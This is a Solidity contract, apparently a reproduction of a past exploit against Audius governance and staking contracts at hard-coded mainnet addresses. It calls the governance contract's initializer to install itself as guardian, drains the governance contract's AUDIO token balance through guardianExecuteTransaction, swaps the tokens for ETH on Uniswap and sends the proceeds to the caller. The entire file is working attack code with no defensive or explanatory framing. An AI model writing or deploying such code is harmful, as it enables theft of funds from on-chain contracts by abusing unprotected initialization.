// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@uniswap/v2-periphery/interfaces/IUniswapV2Router02.sol";
import "./interfaces/AudiusInterfaces.sol";

contract AudiusExploit2 {
    address constant governanceAddress =
        0x4DEcA517D6817B6510798b7328F2314d3003AbAC;
    IGovernance constant governance = IGovernance(governanceAddress);
    address constant stakingAddress = 0xe6D97B2099F142513be7A2a068bE040656Ae4591;
    IStaking constant staking = IStaking(stakingAddress);
    address constant dmanagerAddress =
        0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225;
    IDelegateManagerV2 constant dmanager = IDelegateManagerV2(dmanagerAddress);
    address constant tokenAddress = 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
    ERC20 constant token = ERC20(tokenAddress);
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant router = IUniswapV2Router02(routerAddress);

    function exploit() public {
        // tx: 0xfefd829e246002a8fd061eede7501bccb6e244a9aacea0ebceaecef5d877a984
        governance.initialize(address(this), 3, 0, 1, 4, address(this));

        governance.guardianExecuteTransaction(
            0x3078000000000000000000000000000000000000000000000000000000000000,
            0,
            "transfer(address,uint256)",
            abi.encode(address(this), token.balanceOf(address(governance)))
        );

        // tx: 0x82fc23992c7433fffad0e28a1b8d11211dc4377de83e88088d79f24f4a3f28b3
        token.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
        path[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        router.swapExactTokensForETH(
            18564497819999999999735541,
            680000000000000000000,
            path,
            address(this),
            1658617923
        );
        payable(msg.sender).transfer(address(this).balance);
    }

    function getContract(bytes32 _name)
        external
        view
        returns (address contractAddr)
    {
        return tokenAddress; // $AUDIO token address
    }

    receive() external payable {}
}